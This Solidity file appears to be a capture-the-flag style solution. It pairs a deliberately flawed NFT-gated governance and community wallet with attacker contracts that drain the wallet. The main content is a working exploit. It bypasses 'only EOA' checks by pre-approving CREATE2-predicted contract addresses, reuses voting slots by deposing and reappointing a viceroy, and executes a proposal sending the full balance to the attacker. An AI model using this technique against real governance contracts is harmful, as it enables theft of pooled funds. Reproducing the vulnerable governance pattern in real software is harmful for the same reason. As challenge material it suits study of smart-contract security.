// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract OligarchyNFT is ERC721 {
    constructor(address attacker) ERC721("Oligarch", "OG") {
        _mint(attacker, 1);
    }

    function _beforeTokenTransfer(address from, address, uint256, uint256) internal virtual override {
        require(from == address(0), "Cannot transfer nft"); // oligarch cannot transfer the NFT
    }
}

contract Governance {
    IERC721 private immutable oligargyNFT;
    CommunityWallet public immutable communityWallet;
    mapping(uint256 => bool) public idUsed;
    mapping(address => bool) public alreadyVoted;

    struct Appointment {
        //approvedVoters: mapping(address => bool),
        uint256 appointedBy; // oligarchy ids are > 0 so we can use this as a flag
        uint256 numAppointments;
        mapping(address => bool) approvedVoter;
    }

    struct Proposal {
        uint256 votes;
        bytes data;
    }

    mapping(address => Appointment) public viceroys;
    mapping(uint256 => Proposal) public proposals;

    constructor(ERC721 _oligarchyNFT) payable {
        oligargyNFT = _oligarchyNFT;
        communityWallet = new CommunityWallet{value: msg.value}(address(this));
    }

    /*
     * @dev an oligarch can appoint a viceroy if they have an NFT
     * @param viceroy: the address who will be able to appoint voters
     * @param id: the NFT of the oligarch
     */
    function appointViceroy(address viceroy, uint256 id) external {
        require(oligargyNFT.ownerOf(id) == msg.sender, "not an oligarch");
        require(!idUsed[id], "already appointed a viceroy");
        require(viceroy.code.length == 0, "only EOA");

        idUsed[id] = true;
        viceroys[viceroy].appointedBy = id;
        viceroys[viceroy].numAppointments = 5;
    }

    function deposeViceroy(address viceroy, uint256 id) external {
        require(oligargyNFT.ownerOf(id) == msg.sender, "not an oligarch");
        require(viceroys[viceroy].appointedBy == id, "only the appointer can depose");

        idUsed[id] = false;
        delete viceroys[viceroy];
    }

    function approveVoter(address voter) external {
        require(viceroys[msg.sender].appointedBy != 0, "not a viceroy");
        require(voter != msg.sender, "cannot add yourself");
        require(!viceroys[msg.sender].approvedVoter[voter], "cannot add same voter twice");
        require(viceroys[msg.sender].numAppointments > 0, "no more appointments");
        require(voter.code.length == 0, "only EOA");

        viceroys[msg.sender].numAppointments -= 1;
        viceroys[msg.sender].approvedVoter[voter] = true;
    }

    function disapproveVoter(address voter) external {
        require(viceroys[msg.sender].appointedBy != 0, "not a viceroy");
        require(viceroys[msg.sender].approvedVoter[voter], "cannot disapprove an unapproved address");
        viceroys[msg.sender].numAppointments += 1;
        delete viceroys[msg.sender].approvedVoter[voter];
    }

    function createProposal(address viceroy, bytes calldata proposal) external {
        require(
            viceroys[msg.sender].appointedBy != 0 || viceroys[viceroy].approvedVoter[msg.sender],
            "sender not a viceroy or voter"
        );

        uint256 proposalId = uint256(keccak256(proposal));
        proposals[proposalId].data = proposal;
    }

    function voteOnProposal(uint256 proposal, bool inFavor, address viceroy) external {
        require(proposals[proposal].data.length != 0, "proposal not found");
        require(viceroys[viceroy].approvedVoter[msg.sender], "Not an approved voter");
        require(!alreadyVoted[msg.sender], "Already voted");
        if (inFavor) {
            proposals[proposal].votes += 1;
        }
        alreadyVoted[msg.sender] = true;
    }

    function executeProposal(uint256 proposal) external {
        require(proposals[proposal].votes >= 10, "Not enough votes");
        (bool res, ) = address(communityWallet).call(proposals[proposal].data);
        require(res, "call failed");
    }
}

contract CommunityWallet {
    address public governance;

    constructor(address _governance) payable {
        governance = _governance;
    }

    function exec(address target, bytes calldata data, uint256 value) external {
        require(msg.sender == governance, "Caller is not governance contract");
        (bool res, ) = target.call{value: value}(data);
        require(res, "call failed");
    }

    fallback() external payable {}
}

contract AttackerViceroy {
    Governance governance;

    constructor(Governance _governance) {
        governance = _governance;
    }

    function createProposal(address receiver) external returns (uint256 proposalId) {
        CommunityWallet wallet = governance.communityWallet();

        bytes memory proposal = abi.encodeWithSignature(
            "exec(address,bytes,uint256)",
            receiver,
            "0x01010101", // any data
            address(wallet).balance
        );

        governance.createProposal(msg.sender, proposal);
        proposalId = uint256(keccak256(proposal));
    }

    function approveVoter(address voter) external {
        governance.approveVoter(voter);
    }
}

contract AttackerVoter {
    Governance governance;

    constructor(Governance _governance) {
        governance = _governance;
    }

    function voteOnProposal(uint256 proposalId, address viceroy) external {
        governance.voteOnProposal(proposalId, true, viceroy);
    }
}

contract GovernanceAttacker {
    uint256 TOKEN_ID = 1;

    uint256 proposalId;

    Governance governance;
    AttackerViceroy viceroy;

    function attack(Governance governance_) external {
        governance = governance_;

        // 1. Deploy a malicious Viceroy contract with predicted address to avoid EOA check
        _deployViceroyAndAppointIt(bytes32(0));

        // 2. Create a malicious proposal on behalf of the malicious Viceroy
        //    The malicious proposal will send all the funds to the attacker
        _createMaliciousProposal();

        // 3. Create 5 voters and vote on the malicious proposal
        //    5 is the maximum number of voters that can be appointed by a Viceroy
        for (uint256 i = 5; i > 0; i--) {
            _createVoterAndVoteOnProposal(bytes32(i));
        }

        // 4. Depose the current Viceroy to replace it with the new one
        _deposeCurrentViceroy();

        // 5. Deploy a new malicious Viceroy and appoint it
        _deployViceroyAndAppointIt(bytes32(uint256(1)));

        // 6. Create new 5 voters and vote on the malicious proposal
        //    After this step, the proposal will have 10 votes and cab be executed
        for (uint256 i = 10; i > 5; i--) {
            _createVoterAndVoteOnProposal(bytes32(i));
        }

        // 7. Execute the malicious proposal
        _executeProposal();
    }

    function _deployViceroyAndAppointIt(bytes32 salt) internal {
        bytes memory bytecode = abi.encodePacked(type(AttackerViceroy).creationCode, abi.encode(governance));
        address viceroyAddress = _predictAddress(salt, bytecode);

        governance.appointViceroy(viceroyAddress, TOKEN_ID);

        viceroy = new AttackerViceroy{salt: salt}(governance);
        require(address(viceroy) == viceroyAddress, "Error deploying Viceroy");
    }

    function _createMaliciousProposal() internal {
        proposalId = viceroy.createProposal(msg.sender);
        require(proposalId > 0, "Error creating proposal");
    }

    function _createVoterAndVoteOnProposal(bytes32 salt) internal {
        bytes memory bytecode = abi.encodePacked(type(AttackerVoter).creationCode, abi.encode(governance));
        address voterAddress = _predictAddress(salt, bytecode);

        viceroy.approveVoter(voterAddress);
        AttackerVoter voter = new AttackerVoter{salt: salt}(governance);

        voter.voteOnProposal(proposalId, address(viceroy));
    }

    function _deposeCurrentViceroy() internal {
        governance.deposeViceroy(address(viceroy), TOKEN_ID);
    }

    function _executeProposal() internal {
        governance.executeProposal(proposalId);
    }

    function _predictAddress(bytes32 salt, bytes memory bytecode) internal returns (address) {
        return
            address(uint160(uint(keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, keccak256(bytecode))))));
    }
}
